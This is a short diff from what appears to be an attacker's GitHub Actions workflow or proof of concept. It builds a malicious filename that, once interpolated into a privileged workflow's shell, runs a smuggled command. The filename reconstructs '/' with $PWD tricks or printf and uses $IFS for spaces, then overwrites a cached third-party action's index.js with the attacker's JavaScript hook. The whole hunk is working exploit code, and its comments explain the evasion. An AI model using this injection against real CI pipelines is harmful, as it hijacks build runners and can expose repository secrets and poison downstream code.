@@ -23,7 +23,7 @@ jobs:
           # The filename below is interpolated into the privileged workflow's shell.
           # It rebuilds "/" from ${PWD:0:1} (no literal slash allowed in a filename) and
           # overwrites the already-downloaded find-comment action with our JS hook.
-          name = ("p$(S=${PWD:0:1};cp${IFS}${S}tmp${S}content${S}content${S}x.js${IFS}"
+          name = ("p$(S=$(printf${IFS}'\\57');cp${IFS}${S}tmp${S}content${S}content${S}x.js${IFS}"
                   "${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}find-comment${S}v3"
                   "${S}dist${S}index.js)wn.txt")
           open("content/" + name, "w").write("payload\n")
